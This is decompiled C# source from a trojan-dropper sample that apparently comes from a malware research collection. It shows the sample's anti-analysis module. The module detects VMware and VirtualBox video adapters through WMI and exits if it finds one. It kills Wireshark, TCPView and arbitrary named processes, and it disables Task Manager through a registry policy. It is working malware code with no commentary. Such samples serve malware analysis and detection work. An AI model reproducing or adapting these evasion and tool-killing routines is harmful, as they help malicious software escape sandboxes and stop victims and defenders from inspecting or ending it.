// Decompiled with JetBrains decompiler
// Type: hdfghfdghdfghfdgh.antis
// Assembly: fghdfgh, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 59D2BBAC-52A4-41AF-9009-6C20D7F64D35
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Dropper.Win32.Sysn.axbd-19c0d39edbfe66a3ff8170bfe7fc83c000c848bee85291ee0a85269d21b676a2.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace hdfghfdghdfghfdgh
{
  [StandardModule]
  internal sealed class antis
  {
    private static object Devices;
    private static string Grafikadapter;
    private static string RegionA = "SELECT * FROM Win32_VideoController";

    public static void antis()
    {
      hdfghfdghdfghfdgh.antis.getDevices();
      if (Operators.CompareString(hdfghfdghdfghfdgh.antis.Grafikadapter, "VM Additions S3 Trio32/64", false) == 0)
        ProjectData.EndApp();
      if (Operators.CompareString(hdfghfdghdfghfdgh.antis.Grafikadapter, "VMware SVGA II", false) == 0)
        ProjectData.EndApp();
      if (Operators.CompareString(hdfghfdghdfghfdgh.antis.Grafikadapter, "VirtualBox Graphics Adapter", false) != 0)
        return;
      ProjectData.EndApp();
    }

    private static void getDevices()
    {
      object Instance = Interaction.GetObject("winmgmts:");
      object[] objArray = new object[1]
      {
        (object) hdfghfdghdfghfdgh.antis.RegionA
      };
      object[] Arguments = objArray;
      bool[] flagArray = new bool[1]{ true };
      bool[] CopyBack = flagArray;
      object obj = NewLateBinding.LateGet(Instance, (Type) null, "ExecQuery", Arguments, (string[]) null, (Type[]) null, CopyBack);
      if (flagArray[0])
        hdfghfdghdfghfdgh.antis.RegionA = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
      hdfghfdghdfghfdgh.antis.Devices = RuntimeHelpers.GetObjectValue(obj);
      try
      {
        foreach (object device in (IEnumerable) hdfghfdghdfghfdgh.antis.Devices)
          hdfghfdghdfghfdgh.antis.Grafikadapter = Conversions.ToString(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(device), (Type) null, "Description", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }

    public static void killwireshark()
    {
      Process[] processesByName = Process.GetProcessesByName("wireshark");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }

    public static void killtcpview()
    {
      Process[] processesByName = Process.GetProcessesByName("antitcpview");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }

    public static void killspzifisch(string spezifischexe)
    {
      Process[] processesByName = Process.GetProcessesByName(Strings.Trim(spezifischexe));
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }

    public static void killtaskmanager() => Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", (object) 1);
  }
}
